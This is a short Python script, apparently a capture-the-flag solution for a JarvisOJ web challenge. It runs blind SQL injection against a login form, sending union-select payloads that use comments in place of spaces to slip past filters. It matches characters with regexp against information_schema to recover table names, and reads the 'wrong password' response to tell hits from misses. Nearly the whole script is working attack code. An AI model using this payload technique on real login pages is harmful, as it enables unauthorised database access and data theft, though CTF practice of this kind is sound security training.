import requests
import string

cookies = {
    'PHPSESSID': 'quob421sg6f9ie8ir1d9ioaiu1',
}

headers = {
    'Host': 'web.jarvisoj.com:32787',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
}

a = ""
# for i in range(100):
for s in string.printable:
    data = {
      'username': "'/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/binary/**/'^{}'#".format(s),
      'password': '123'
    }
    #data['username'] += ".*$'#"
    response = requests.post('http://web.jarvisoj.com:32787/login.php', headers=headers, data=data)
    print(data['username'])
    if("密码错误" in response.text):
        a += s
        print(s)